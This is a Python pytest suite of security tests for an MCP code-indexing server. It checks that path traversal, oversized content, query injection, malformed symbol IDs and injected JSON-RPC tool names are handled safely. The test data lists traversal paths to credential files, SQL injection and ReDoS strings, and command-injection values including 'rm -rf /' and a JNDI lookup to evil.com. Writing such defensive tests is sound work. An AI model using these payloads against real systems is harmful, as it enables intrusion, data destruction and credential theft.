"""
Security tests for the flyto-indexer MCP server.

Tests path traversal, file size limits, query injection,
symbol ID safety, and protocol-level safety.
"""

import json
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import pytest

from mcp_server import (
    search_by_keyword,
    get_file_info,
    get_file_symbols,
    get_file_context,
    get_symbol_content,
    find_references,
    fulltext_search,
    impact_analysis,
    find_dead_code,
    find_todos,
    cross_project_impact,
    dependency_graph,
    edit_impact_preview,
    load_index,
    handle_request,
    send_response,
    send_error,
)
import mcp_server


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_mock_index(symbols=None, dependencies=None, reverse_index=None,
                     projects=None, project_roots=None):
    """Build a minimal mock index dict."""
    return {
        "symbols": symbols or {},
        "dependencies": dependencies or {},
        "reverse_index": reverse_index or {},
        "projects": projects or ["test-proj"],
        "project_roots": project_roots or {},
    }


def _install_mock_index(mock_index):
    """Patch the module-level _index_cache so load_index() returns mock_index."""
    mcp_server._index_cache = mock_index


def _restore_index(old_cache):
    mcp_server._index_cache = old_cache


@pytest.fixture(autouse=True)
def _isolate_index_cache():
    """Save and restore the global index cache around every test."""
    old_cache = mcp_server._index_cache
    old_content_cache = mcp_server._content_cache.copy()
    old_content_loaded = mcp_server._content_loaded
    old_mapper = mcp_server._test_mapper
    yield
    mcp_server._index_cache = old_cache
    mcp_server._content_cache = old_content_cache
    mcp_server._content_loaded = old_content_loaded
    mcp_server._test_mapper = old_mapper


# ===========================================================================
# 1. Path Traversal
# ===========================================================================

class TestPathTraversal:
    """Test that path traversal attacks are handled safely.

    The MCP server operates on an in-memory index keyed by relative paths.
    Path parameters that attempt directory traversal (../../etc/passwd) should
    NOT produce results from outside the indexed codebase. The functions look
    up paths as dict keys, so unrecognized paths should simply return empty or
    error results rather than leaking filesystem data.
    """

    TRAVERSAL_PATHS = [
        "../../etc/passwd",
        "../../../etc/shadow",
        "../../../../etc/hosts",
        "../.env",
        "../../.git/config",
        "./../../../etc/passwd",
        "src/../../etc/passwd",
        "src/../../../etc/passwd",
    ]

    ABSOLUTE_PATHS = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/proc/self/environ",
        "/dev/null",
    ]

    NULL_BYTE_PATHS = [
        "file\x00.py",
        "src/auth\x00.py",
        "../../etc/passwd\x00.py",
        "\x00",
    ]

    WINDOWS_PATHS = [
        "..\\..\\etc\\passwd",
        "..\\..\\Windows\\System32\\config\\SAM",
        "src\\..\\..\\etc\\passwd",
        "C:\\Windows\\System32\\config\\SAM",
    ]

    # -- get_file_info -------------------------------------------------------

    @pytest.mark.parametrize("malicious_path", TRAVERSAL_PATHS)
    def test_get_file_info_traversal(self, malicious_path):
        """get_file_info must not return data for traversal paths."""
        _install_mock_index(_make_mock_index())
        result = get_file_info(malicious_path)
        assert "error" in result or result.get("purpose") == ""

    @pytest.mark.parametrize("malicious_path", ABSOLUTE_PATHS)
    def test_get_file_info_absolute(self, malicious_path):
        """get_file_info must not expose filesystem files via absolute paths."""
        _install_mock_index(_make_mock_index())
        result = get_file_info(malicious_path)
        assert "error" in result or result.get("purpose") == ""

    @pytest.mark.parametrize("malicious_path", NULL_BYTE_PATHS)
    def test_get_file_info_null_bytes(self, malicious_path):
        """get_file_info handles null bytes without crashing."""
        _install_mock_index(_make_mock_index())
        result = get_file_info(malicious_path)
        # Must not raise; should return error or empty
        assert isinstance(result, dict)

    @pytest.mark.parametrize("malicious_path", WINDOWS_PATHS)
    def test_get_file_info_windows_traversal(self, malicious_path):
        """get_file_info handles Windows-style traversal paths."""
        _install_mock_index(_make_mock_index())
        result = get_file_info(malicious_path)
        assert isinstance(result, dict)
        assert "error" in result or result.get("purpose") == ""

    # -- get_file_symbols ----------------------------------------------------

    @pytest.mark.parametrize("malicious_path", TRAVERSAL_PATHS)
    def test_get_file_symbols_traversal(self, malicious_path):
        """get_file_symbols must return empty for traversal paths."""
        _install_mock_index(_make_mock_index())
        result = get_file_symbols(malicious_path)
        assert result["count"] == 0
        assert result["symbols"] == []

    @pytest.mark.parametrize("malicious_path", ABSOLUTE_PATHS)
    def test_get_file_symbols_absolute(self, malicious_path):
        """get_file_symbols must return empty for absolute paths."""
        _install_mock_index(_make_mock_index())
        result = get_file_symbols(malicious_path)
        assert result["count"] == 0

    @pytest.mark.parametrize("malicious_path", NULL_BYTE_PATHS)
    def test_get_file_symbols_null_bytes(self, malicious_path):
        """get_file_symbols handles null bytes without crashing."""
        _install_mock_index(_make_mock_index())
        result = get_file_symbols(malicious_path)
        assert isinstance(result, dict)
        assert result["count"] == 0

    # -- get_file_context ----------------------------------------------------

    @pytest.mark.parametrize("malicious_path", TRAVERSAL_PATHS)
    def test_get_file_context_traversal(self, malicious_path):
        """get_file_context must not leak data for traversal paths."""
        _install_mock_index(_make_mock_index())
        mcp_server._test_mapper = None
        result = get_file_context(malicious_path)
        assert result["symbols"] == []
        assert result["summary"]["total_symbols"] == 0

    @pytest.mark.parametrize("malicious_path", ABSOLUTE_PATHS)
    def test_get_file_context_absolute(self, malicious_path):
        """get_file_context must not leak data for absolute paths."""
        _install_mock_index(_make_mock_index())
        mcp_server._test_mapper = None
        result = get_file_context(malicious_path)
        assert result["symbols"] == []

    @pytest.mark.parametrize("malicious_path", WINDOWS_PATHS)
    def test_get_file_context_windows_traversal(self, malicious_path):
        """get_file_context handles Windows-style paths."""
        _install_mock_index(_make_mock_index())
        mcp_server._test_mapper = None
        result = get_file_context(malicious_path)
        assert isinstance(result, dict)
        assert result["symbols"] == []

    # -- dependency_graph ----------------------------------------------------

    @pytest.mark.parametrize("malicious_path", TRAVERSAL_PATHS + ABSOLUTE_PATHS)
    def test_dependency_graph_traversal(self, malicious_path):
        """dependency_graph should not traverse beyond the index."""
        _install_mock_index(_make_mock_index())
        result = dependency_graph(file_path=malicious_path)
        assert result["imports"] == []
        assert result["dependents"] == []

    # -- Traversal path must never match a real indexed file -----------------

    def test_traversal_does_not_match_indexed_file(self):
        """Even if a file named 'etc/passwd' is indexed, ../../etc/passwd must not match it."""
        mock_index = _make_mock_index(
            symbols={
                "proj:etc/passwd:function:read_secrets": {
                    "path": "etc/passwd",
                    "name": "read_secrets",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Reads secrets",
                }
            }
        )
        _install_mock_index(mock_index)

        # The traversal path "../../etc/passwd" should NOT resolve to "etc/passwd"
        result = get_file_symbols("../../etc/passwd")
        assert result["count"] == 0, (
            "Path traversal '../../etc/passwd' must not match indexed 'etc/passwd'"
        )

    def test_null_byte_truncation_attack(self):
        """Null byte must not cause path to match a truncated key."""
        mock_index = _make_mock_index(
            symbols={
                "proj:src/auth.py:function:login": {
                    "path": "src/auth.py",
                    "name": "login",
                    "type": "function",
                    "start_line": 1,
                }
            }
        )
        _install_mock_index(mock_index)

        # "src/auth.py\x00malicious" should not match "src/auth.py"
        result = get_file_symbols("src/auth.py\x00malicious")
        assert result["count"] == 0


# ===========================================================================
# 2. File Size / Content Limits
# ===========================================================================

class TestFileSizeLimits:
    """Test that content returned by the MCP server is bounded.

    Even if the index contains large content, the API should truncate
    or limit what it returns to prevent denial-of-service via huge responses.
    """

    def test_search_snippet_is_bounded(self):
        """search_by_keyword with include_content=True truncates snippets."""
        large_content = "x" * 100_000  # 100KB of content
        mock_index = _make_mock_index(
            symbols={
                "proj:big.py:function:big_func": {
                    "path": "big.py",
                    "name": "big_func",
                    "type": "function",
                    "start_line": 1,
                    "summary": "A big function",
                    "content": large_content,
                }
            }
        )
        _install_mock_index(mock_index)

        result = search_by_keyword("big_func", include_content=True)
        assert result["total"] >= 1

        for r in result["results"]:
            if "snippet" in r:
                assert len(r["snippet"]) <= 500, (
                    f"Snippet must be at most 500 chars, got {len(r['snippet'])}"
                )

    def test_get_symbol_content_returns_full_but_finite(self):
        """get_symbol_content returns content; verify it does not crash on large data."""
        large_content = "y = 1\n" * 50_000  # ~300KB
        mock_index = _make_mock_index(
            symbols={
                "proj:huge.py:function:huge": {
                    "path": "huge.py",
                    "name": "huge",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Huge function",
                    "content": large_content,
                }
            }
        )
        _install_mock_index(mock_index)

        result = get_symbol_content("proj:huge.py:function:huge")
        assert "error" not in result
        assert isinstance(result["content"], str)

    def test_file_context_content_truncated(self):
        """get_file_context with include_content=True truncates to 500 chars."""
        large_content = "z" * 10_000
        mock_index = _make_mock_index(
            symbols={
                "proj:large.py:function:big": {
                    "path": "large.py",
                    "name": "big",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Big func",
                    "content": large_content,
                }
            }
        )
        _install_mock_index(mock_index)
        mcp_server._test_mapper = None

        result = get_file_context("large.py", include_content=True)
        for sym in result["symbols"]:
            if "content" in sym:
                assert len(sym["content"]) <= 500

    def test_summary_field_truncated_in_search(self):
        """Search results truncate summary to 150 chars."""
        long_summary = "S" * 1000
        mock_index = _make_mock_index(
            symbols={
                "proj:s.py:function:summarized": {
                    "path": "s.py",
                    "name": "summarized",
                    "type": "function",
                    "start_line": 1,
                    "summary": long_summary,
                    "content": "def summarized(): pass",
                }
            }
        )
        _install_mock_index(mock_index)

        result = search_by_keyword("summarized")
        for r in result["results"]:
            assert len(r["summary"]) <= 150

    def test_fulltext_match_text_bounded(self):
        """fulltext_search truncates match text to 100 chars."""
        content_with_long_comment = "# " + "A" * 500 + "\ndef foo(): pass"
        mock_index = _make_mock_index(
            symbols={
                "proj:commented.py:function:foo": {
                    "path": "commented.py",
                    "name": "foo",
                    "type": "function",
                    "start_line": 1,
                    "content": content_with_long_comment,
                }
            }
        )
        _install_mock_index(mock_index)

        result = fulltext_search("AAAA", search_type="comment")
        for r in result["results"]:
            for m in r.get("matches", []):
                assert len(m["text"]) <= 100

    def test_max_results_honored(self):
        """search_by_keyword respects max_results parameter."""
        symbols = {}
        for i in range(100):
            sid = f"proj:file{i}.py:function:func_{i}"
            symbols[sid] = {
                "path": f"file{i}.py",
                "name": f"func_{i}",
                "type": "function",
                "start_line": 1,
                "summary": "A function named func",
                "content": f"def func_{i}(): pass",
            }
        mock_index = _make_mock_index(symbols=symbols)
        _install_mock_index(mock_index)

        result = search_by_keyword("func", max_results=5)
        assert result["showing"] <= 5
        assert len(result["results"]) <= 5


# ===========================================================================
# 3. Query Safety
# ===========================================================================

class TestQuerySafety:
    """Test that malicious query inputs do not cause errors or exploits.

    The MCP server uses queries as dict key lookups and in regex (via
    re.escape). SQL injection is irrelevant (no SQL), but we test that
    special characters, extremely long strings, and binary data are handled
    gracefully.
    """

    def _simple_index(self):
        return _make_mock_index(
            symbols={
                "proj:auth.py:function:login": {
                    "path": "auth.py",
                    "name": "login",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Login function",
                    "content": "def login(user, pw): return True",
                }
            }
        )

    # -- SQL-like injection --------------------------------------------------

    SQL_INJECTIONS = [
        "'; DROP TABLE symbols; --",
        "\" OR 1=1 --",
        "'; DELETE FROM index WHERE 1=1; --",
        "UNION SELECT * FROM secrets",
        "1; EXEC xp_cmdshell('whoami')",
        "' OR ''='",
    ]

    @pytest.mark.parametrize("query", SQL_INJECTIONS)
    def test_search_sql_injection(self, query):
        """SQL-like injection in search queries must not cause errors."""
        _install_mock_index(self._simple_index())
        result = search_by_keyword(query)
        assert isinstance(result, dict)
        assert "results" in result

    @pytest.mark.parametrize("query", SQL_INJECTIONS)
    def test_fulltext_sql_injection(self, query):
        """SQL-like injection in fulltext search must not cause errors."""
        _install_mock_index(self._simple_index())
        result = fulltext_search(query)
        assert isinstance(result, dict)
        assert "results" in result

    # -- Regex special characters --------------------------------------------

    REGEX_SPECIALS = [
        ".*",
        "(a{1000}){1000}",
        "[a-z]+",
        "(?:a+)+$",
        "\\d+\\.\\d+",
        "^(a+)+$",  # classic ReDoS
        "((a+)+(b+)+)+",  # nested ReDoS
        "(a|aa)+$",
        "(?=a)(?=b)",
        "(?P<name>.*)",
    ]

    @pytest.mark.parametrize("query", REGEX_SPECIALS)
    def test_search_regex_specials(self, query):
        """Regex special chars in search_by_keyword must be safe (queries are not regex)."""
        _install_mock_index(self._simple_index())
        result = search_by_keyword(query)
        assert isinstance(result, dict)

    @pytest.mark.parametrize("query", REGEX_SPECIALS)
    def test_fulltext_regex_specials(self, query):
        """Regex chars in fulltext_search must be escaped via re.escape."""
        _install_mock_index(self._simple_index())
        # fulltext_search uses re.compile(re.escape(query)) so this must not crash
        result = fulltext_search(query)
        assert isinstance(result, dict)

    # -- Extremely long strings ----------------------------------------------

    def test_search_extremely_long_query(self):
        """Extremely long query (100KB) must not crash the server."""
        _install_mock_index(self._simple_index())
        long_query = "a" * 100_000
        result = search_by_keyword(long_query)
        assert isinstance(result, dict)
        # Should simply find no matches
        assert result["total"] == 0

    def test_fulltext_extremely_long_query(self):
        """Extremely long fulltext query must not crash."""
        _install_mock_index(self._simple_index())
        long_query = "x" * 100_000
        result = fulltext_search(long_query)
        assert isinstance(result, dict)

    def test_search_empty_query(self):
        """Empty string query should return no results, not crash."""
        _install_mock_index(self._simple_index())
        result = search_by_keyword("")
        assert isinstance(result, dict)
        # Empty query splits to [''], matching everything or nothing is both acceptable
        assert "results" in result

    # -- Binary / non-UTF8 data ----------------------------------------------

    def test_search_binary_query(self):
        """Binary data in query should not crash."""
        _install_mock_index(self._simple_index())
        # Simulate binary content that survived JSON decode (unlikely but defensive)
        binary_query = "\x00\x01\x02\xff\xfe"
        result = search_by_keyword(binary_query)
        assert isinstance(result, dict)

    def test_fulltext_binary_query(self):
        """Binary data in fulltext query should not crash."""
        _install_mock_index(self._simple_index())
        binary_query = "\x00\x01\x02\x03"
        result = fulltext_search(binary_query)
        assert isinstance(result, dict)

    # -- Unicode edge cases --------------------------------------------------

    UNICODE_QUERIES = [
        "\u200b",                   # zero-width space
        "\u200d",                   # zero-width joiner
        "\ufeff",                   # BOM
        "\ud800",                   # lone surrogate (may cause issues)
        "login\u0000admin",         # null in the middle
        "\U0001f600",               # emoji
        "\u202e" + "drowssap",      # right-to-left override
    ]

    @pytest.mark.parametrize("query", UNICODE_QUERIES)
    def test_search_unicode_edge_cases(self, query):
        """Unicode edge-case queries must not crash."""
        _install_mock_index(self._simple_index())
        try:
            result = search_by_keyword(query)
            assert isinstance(result, dict)
        except (UnicodeEncodeError, UnicodeDecodeError):
            # Acceptable to reject but not to crash with unhandled exception
            pass

    # -- Catastrophic backtracking (ReDoS) -----------------------------------

    def test_fulltext_redos_resistance(self):
        """fulltext_search should use re.escape and thus be immune to ReDoS."""
        # The malicious pattern would cause catastrophic backtracking if used
        # as a raw regex against a string of 'a's.
        _install_mock_index(_make_mock_index(
            symbols={
                "proj:target.py:function:target": {
                    "path": "target.py",
                    "name": "target",
                    "type": "function",
                    "start_line": 1,
                    "content": "a" * 1000,
                }
            }
        ))
        # This should complete quickly because fulltext_search uses re.escape
        import time
        start = time.time()
        result = fulltext_search("(a+)+$")
        elapsed = time.time() - start
        assert elapsed < 5.0, f"fulltext_search took {elapsed:.1f}s, possible ReDoS"
        assert isinstance(result, dict)

    def test_find_references_redos_resistance(self):
        """find_references uses re.escape(target_name) in content search."""
        mock_index = _make_mock_index(
            symbols={
                "proj:lib.py:function:helper": {
                    "path": "lib.py",
                    "name": "helper",
                    "type": "function",
                    "start_line": 1,
                    "content": "def helper(): pass",
                },
                "proj:app.py:function:app": {
                    "path": "app.py",
                    "name": "app",
                    "type": "function",
                    "start_line": 1,
                    "content": "helper() " * 100,
                },
            }
        )
        _install_mock_index(mock_index)

        import time
        start = time.time()
        result = find_references("proj:lib.py:function:helper")
        elapsed = time.time() - start
        assert elapsed < 5.0
        assert isinstance(result, dict)


# ===========================================================================
# 4. Symbol ID Safety
# ===========================================================================

class TestSymbolIdSafety:
    """Test that malformed symbol IDs are handled gracefully."""

    def _index_with_symbol(self):
        return _make_mock_index(
            symbols={
                "proj:src/utils.py:function:helper": {
                    "path": "src/utils.py",
                    "name": "helper",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Helper function",
                    "content": "def helper(): return 42",
                }
            },
            reverse_index={
                "proj:src/utils.py:function:helper": [],
            },
        )

    # -- Path traversal in symbol IDs ----------------------------------------

    TRAVERSAL_SYMBOL_IDS = [
        "proj:../../etc/passwd:function:read",
        "proj:/etc/passwd:function:read",
        "proj:..\\..\\etc\\passwd:function:read",
        "../../../etc/shadow",
        "proj:src/../../../etc/passwd:function:login",
    ]

    @pytest.mark.parametrize("symbol_id", TRAVERSAL_SYMBOL_IDS)
    def test_get_symbol_content_traversal(self, symbol_id):
        """get_symbol_content must return error for traversal symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = get_symbol_content(symbol_id)
        # Should not return content from outside the index
        assert "error" in result or result.get("content", "") == ""

    @pytest.mark.parametrize("symbol_id", TRAVERSAL_SYMBOL_IDS)
    def test_find_references_traversal(self, symbol_id):
        """find_references handles traversal symbol IDs without error."""
        _install_mock_index(self._index_with_symbol())
        result = find_references(symbol_id)
        assert isinstance(result, dict)
        # Either returns error or empty references
        assert "error" in result or result.get("total", 0) == 0

    @pytest.mark.parametrize("symbol_id", TRAVERSAL_SYMBOL_IDS)
    def test_impact_analysis_traversal(self, symbol_id):
        """impact_analysis handles traversal symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = impact_analysis(symbol_id)
        assert isinstance(result, dict)

    @pytest.mark.parametrize("symbol_id", TRAVERSAL_SYMBOL_IDS)
    def test_edit_impact_preview_traversal(self, symbol_id):
        """edit_impact_preview handles traversal symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = edit_impact_preview(symbol_id)
        assert isinstance(result, dict)
        # Should return error or safe result
        assert "error" in result or isinstance(result.get("total_call_sites"), int)

    # -- Empty / null symbol IDs ---------------------------------------------

    EMPTY_IDS = [
        "",
        " ",
        "\t",
        "\n",
        "\x00",
    ]

    @pytest.mark.parametrize("symbol_id", EMPTY_IDS)
    def test_get_symbol_content_empty(self, symbol_id):
        """get_symbol_content handles empty/whitespace symbol IDs.

        NOTE: Empty string "" is a substring of every string in Python,
        so the fuzzy matching in get_symbol_content will resolve "" to the
        first symbol found. This is a known behavior -- the function does
        not crash, but it may return unintended data. Ideally the function
        should reject empty/blank IDs explicitly. For now we verify it
        does not crash.
        """
        _install_mock_index(self._index_with_symbol())
        result = get_symbol_content(symbol_id)
        assert isinstance(result, dict)
        # Empty string fuzzy-matches any symbol via `"" in sid` -- known behavior.
        # We verify it does not crash; ideally empty IDs should return an error.

    @pytest.mark.parametrize("symbol_id", EMPTY_IDS)
    def test_find_references_empty(self, symbol_id):
        """find_references handles empty symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = find_references(symbol_id)
        assert isinstance(result, dict)

    @pytest.mark.parametrize("symbol_id", EMPTY_IDS)
    def test_impact_analysis_empty(self, symbol_id):
        """impact_analysis handles empty symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = impact_analysis(symbol_id)
        assert isinstance(result, dict)

    # -- Extremely long symbol IDs -------------------------------------------

    def test_get_symbol_content_very_long_id(self):
        """Very long symbol ID should not crash."""
        _install_mock_index(self._index_with_symbol())
        long_id = "a" * 100_000
        result = get_symbol_content(long_id)
        assert isinstance(result, dict)
        assert "error" in result

    def test_find_references_very_long_id(self):
        """Very long symbol ID in find_references should not crash."""
        _install_mock_index(self._index_with_symbol())
        long_id = "b" * 100_000
        result = find_references(long_id)
        assert isinstance(result, dict)

    # -- Malformed symbol IDs ------------------------------------------------

    MALFORMED_IDS = [
        ":::::",                             # all colons
        "proj:path:type:name:extra:extra2",  # too many parts
        "::::::::::",                         # many colons
        "proj:path",                         # too few parts
        "single",                            # no colons at all
        "proj:path:badtype:name",            # invalid type
    ]

    @pytest.mark.parametrize("symbol_id", MALFORMED_IDS)
    def test_get_symbol_content_malformed(self, symbol_id):
        """get_symbol_content handles malformed symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = get_symbol_content(symbol_id)
        assert isinstance(result, dict)

    @pytest.mark.parametrize("symbol_id", MALFORMED_IDS)
    def test_find_references_malformed(self, symbol_id):
        """find_references handles malformed symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = find_references(symbol_id)
        assert isinstance(result, dict)

    @pytest.mark.parametrize("symbol_id", MALFORMED_IDS)
    def test_edit_impact_preview_malformed(self, symbol_id):
        """edit_impact_preview handles malformed symbol IDs."""
        _install_mock_index(self._index_with_symbol())
        result = edit_impact_preview(symbol_id)
        assert isinstance(result, dict)

    # -- Fuzzy matching should not match traversal paths ---------------------

    def test_fuzzy_match_does_not_resolve_traversal(self):
        """Symbol ID fuzzy matching must not resolve traversal-based IDs
        to real symbols by substring match."""
        mock_index = _make_mock_index(
            symbols={
                "proj:src/utils.py:function:passwd": {
                    "path": "src/utils.py",
                    "name": "passwd",
                    "type": "function",
                    "start_line": 1,
                    "content": "def passwd(): pass",
                }
            }
        )
        _install_mock_index(mock_index)

        # The substring "passwd" appears in the traversal path,
        # but the symbol ID resolution should NOT resolve
        # "../../etc/passwd" to "proj:src/utils.py:function:passwd"
        # via the `symbol_id in sid` check.
        result = get_symbol_content("../../etc/passwd")
        # The fuzzy match `"../../etc/passwd" in "proj:src/utils.py:function:passwd"`
        # is False, so this should return error.
        assert "error" in result or result.get("name") != "passwd" or "passwd" not in result.get("path", "")


# ===========================================================================
# 5. Protocol-Level Safety
# ===========================================================================

class TestProtocolSafety:
    """Test MCP protocol-level security: method dispatch, unknown tools, etc."""

    def _capture_output(self):
        """Return a mock that captures send_response / send_error calls."""
        responses = []
        errors = []

        def mock_send_response(id, result):
            responses.append({"id": id, "result": result})

        def mock_send_error(id, code, message):
            errors.append({"id": id, "code": code, "message": message})

        return responses, errors, mock_send_response, mock_send_error

    # -- Unknown tool names --------------------------------------------------

    def test_unknown_tool_returns_error(self):
        """Calling an unknown tool must return a JSON-RPC error."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {
                    "name": "nonexistent_tool",
                    "arguments": {},
                },
            })

        assert len(errors) == 1
        assert errors[0]["code"] == -32601
        assert "Unknown tool" in errors[0]["message"]

    def test_unknown_method_returns_error(self):
        """Unknown JSON-RPC method returns error."""
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 2,
                "method": "evil/method",
                "params": {},
            })

        assert len(errors) == 1
        assert errors[0]["code"] == -32601

    # -- Missing parameters --------------------------------------------------

    def test_tools_call_missing_name(self):
        """tools/call with missing tool name should error or handle gracefully."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {
                    # no "name" key
                    "arguments": {},
                },
            })

        # Should return error for unknown tool ""
        assert len(errors) == 1

    def test_tools_call_missing_arguments(self):
        """tools/call with missing arguments should use empty dict defaults."""
        _install_mock_index(self._simple_index_for_protocol())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tools/call",
                "params": {
                    "name": "list_projects",
                    # no "arguments" key
                },
            })

        # list_projects takes no arguments, should succeed
        assert len(responses) == 1
        assert len(errors) == 0

    # -- Tool name injection -------------------------------------------------

    INJECTED_TOOL_NAMES = [
        "__import__('os').system('id')",
        "eval('2+2')",
        "search_code; rm -rf /",
        "search_code\nsearch_code",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ]

    @pytest.mark.parametrize("tool_name", INJECTED_TOOL_NAMES)
    def test_injected_tool_names(self, tool_name):
        """Injected tool names must be rejected, not evaluated."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 5,
                "method": "tools/call",
                "params": {
                    "name": tool_name,
                    "arguments": {},
                },
            })

        # Must return error, not execute the injected code
        assert len(errors) == 1
        assert errors[0]["code"] == -32601

    # -- Deeply nested / oversized params ------------------------------------

    def test_deeply_nested_params(self):
        """Deeply nested params should not cause stack overflow."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        # Build deeply nested dict
        nested = {"inner": "value"}
        for _ in range(100):
            nested = {"outer": nested}

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 6,
                "method": "tools/call",
                "params": {
                    "name": "search_code",
                    "arguments": {"query": "test", "extra": nested},
                },
            })

        # Should succeed (extra params are ignored) or error cleanly
        assert len(responses) + len(errors) == 1

    def test_oversized_argument_value(self):
        """Very large argument value should not crash."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 7,
                "method": "tools/call",
                "params": {
                    "name": "search_code",
                    "arguments": {"query": "x" * 1_000_000},
                },
            })

        assert len(responses) + len(errors) == 1

    # -- Integer overflow in numeric params ----------------------------------

    def test_max_results_overflow(self):
        """Very large max_results should not cause memory issues."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 8,
                "method": "tools/call",
                "params": {
                    "name": "search_code",
                    "arguments": {"query": "test", "max_results": 999_999_999},
                },
            })

        # Should return results without crashing (empty index = 0 results)
        assert len(responses) == 1

    def test_negative_max_results(self):
        """Negative max_results should not crash."""
        _install_mock_index(_make_mock_index())
        responses, errors, mock_resp, mock_err = self._capture_output()

        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err):
            handle_request({
                "jsonrpc": "2.0",
                "id": 9,
                "method": "tools/call",
                "params": {
                    "name": "search_code",
                    "arguments": {"query": "test", "max_results": -1},
                },
            })

        assert len(responses) + len(errors) == 1

    # -- Exception handling --------------------------------------------------

    def test_handler_catches_exceptions(self):
        """handle_request catches exceptions and sends error responses."""
        responses, errors, mock_resp, mock_err = self._capture_output()

        # Force load_index to raise
        with patch("mcp_server.send_response", mock_resp), \
             patch("mcp_server.send_error", mock_err), \
             patch("mcp_server.load_index", side_effect=RuntimeError("boom")):
            handle_request({
                "jsonrpc": "2.0",
                "id": 10,
                "method": "tools/call",
                "params": {
                    "name": "search_code",
                    "arguments": {"query": "test"},
                },
            })

        assert len(errors) == 1
        assert errors[0]["code"] == -32000
        assert "boom" in errors[0]["message"]

    # -- Helpers -------------------------------------------------------------

    def _simple_index_for_protocol(self):
        return _make_mock_index()


# ===========================================================================
# 6. Cross-function safety: traversal + injection combos
# ===========================================================================

class TestCombinedAttacks:
    """Test combinations of attack vectors that might bypass individual checks."""

    def _index_with_data(self):
        return _make_mock_index(
            symbols={
                "proj:src/secret.py:function:get_secret": {
                    "path": "src/secret.py",
                    "name": "get_secret",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Returns API key",
                    "content": "def get_secret(): return 'sk-12345'",
                },
                "proj:src/utils.py:function:helper": {
                    "path": "src/utils.py",
                    "name": "helper",
                    "type": "function",
                    "start_line": 1,
                    "summary": "Helper",
                    "content": "def helper(): return 42",
                },
            },
            reverse_index={
                "proj:src/secret.py:function:get_secret": [
                    "proj:src/utils.py:function:helper"
                ],
            },
        )

    def test_search_with_traversal_in_project_filter(self):
        """Project filter with traversal should not bypass safety."""
        _install_mock_index(self._index_with_data())
        result = search_by_keyword("secret", project="../../etc")
        # Traversal in project should simply not match any real project
        assert result["total"] == 0

    def test_dependency_graph_traversal_in_symbol_id(self):
        """dependency_graph with traversal in symbol_id."""
        _install_mock_index(self._index_with_data())
        result = dependency_graph(symbol_id="proj:../../etc/passwd:function:read")
        assert isinstance(result, dict)
        # The path extracted would be "../../etc/passwd" which matches nothing
        assert result["imports"] == []
        assert result["dependents"] == []

    def test_cross_project_impact_with_injection(self):
        """cross_project_impact with SQL/code injection in symbol_name."""
        _install_mock_index(self._index_with_data())
        result = cross_project_impact(
            symbol_name="'; DROP TABLE --",
            source_project=None,
        )
        assert isinstance(result, dict)
        assert "error" in result  # Symbol not found

    def test_find_dead_code_with_malicious_filters(self):
        """find_dead_code with unusual filter values."""
        _install_mock_index(self._index_with_data())

        # Malicious project filter
        result = find_dead_code(project="../../etc")
        assert isinstance(result, dict)
        assert result["total"] == 0

        # Malicious symbol_type
        result = find_dead_code(symbol_type="'; DROP TABLE --")
        assert isinstance(result, dict)
        assert result["total"] == 0

    def test_find_todos_with_malicious_filters(self):
        """find_todos with injection in filters."""
        _install_mock_index(self._index_with_data())

        result = find_todos(project="../../etc", priority="high")
        assert isinstance(result, dict)
        assert result["total"] == 0

    def test_fulltext_search_type_injection(self):
        """Invalid search_type should be handled."""
        _install_mock_index(self._index_with_data())
        result = fulltext_search("test", search_type="'; DROP TABLE --")
        assert isinstance(result, dict)
        # Invalid search_type won't match any branch, so no results
        assert result["total"] == 0

    def test_null_byte_in_symbol_id_does_not_truncate(self):
        """Null bytes in symbol_id should not cause partial matching."""
        _install_mock_index(self._index_with_data())
